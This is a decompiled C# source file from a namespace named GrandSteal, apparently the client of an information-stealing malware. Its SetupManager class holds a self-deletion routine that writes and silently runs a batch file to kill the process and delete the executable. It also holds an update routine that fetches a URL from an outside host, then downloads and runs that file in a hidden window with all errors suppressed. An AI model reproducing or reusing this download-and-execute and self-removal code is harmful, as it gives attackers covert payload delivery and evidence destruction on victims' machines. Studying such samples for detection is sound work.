using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;

namespace GrandSteal.Client.Data.Helpers
{
	// Token: 0x02000007 RID: 7
	public class SetupManager
	{
		// Token: 0x06000031 RID: 49 RVA: 0x00003AB0 File Offset: 0x00001CB0
		public void RemoveSelf()
		{
			File.WriteAllText(Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Local\\Temp\\Remove.bat"), string.Concat(new string[]
			{
				"@ECHO OFF",
				Environment.NewLine,
				"taskkill /F /PID %1",
				Environment.NewLine,
				"choice /C Y /N /D Y /T 3 & Del %2",
				Environment.NewLine,
				"EXIT"
			}));
			try
			{
				if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "ClientSettings.db")))
				{
					File.Delete(Path.Combine(Directory.GetCurrentDirectory(), "ClientSettings.db"));
				}
			}
			catch
			{
			}
			Process.Start(new ProcessStartInfo
			{
				Arguments = string.Format("\"{0}\" \"{1}\"", Process.GetCurrentProcess().Id, Assembly.GetEntryAssembly().Location),
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\AppData\\Local\\Temp\\Remove.bat"),
				WorkingDirectory = Environment.ExpandEnvironmentVariables(Directory.GetCurrentDirectory())
			});
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00003BB0 File Offset: 0x00001DB0
		public void CheckUpdate()
		{
			try
			{
				using (WebClient webClient = new WebClient())
				{
					string text = webClient.DownloadString("https://domekan.ru/ModuleMystery/Updates.txt").Trim();
					if (!string.IsNullOrEmpty(text))
					{
						string[] array = text.Split(new char[]
						{
							'/'
						});
						if (array.Length != 0)
						{
							string text2 = array[array.Length - 1];
							string text3 = Path.Combine(Environment.ExpandEnvironmentVariables(Directory.GetCurrentDirectory()), text2);
							if (!File.Exists(text3))
							{
								if (SetupStorage.Default.Setups == null)
								{
									SetupStorage.Default.Setups = new StringCollection();
									SetupStorage.Default.Save();
								}
								if (!SetupStorage.Default.Setups.Contains(text))
								{
									webClient.DownloadFile(text, text3);
									Process.Start(new ProcessStartInfo
									{
										WindowStyle = ProcessWindowStyle.Hidden,
										CreateNoWindow = true,
										FileName = text2,
										WorkingDirectory = Environment.ExpandEnvironmentVariables(Directory.GetCurrentDirectory())
									});
									SetupStorage.Default.Setups.Add(text);
									SetupStorage.Default.Save();
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}
	}
}
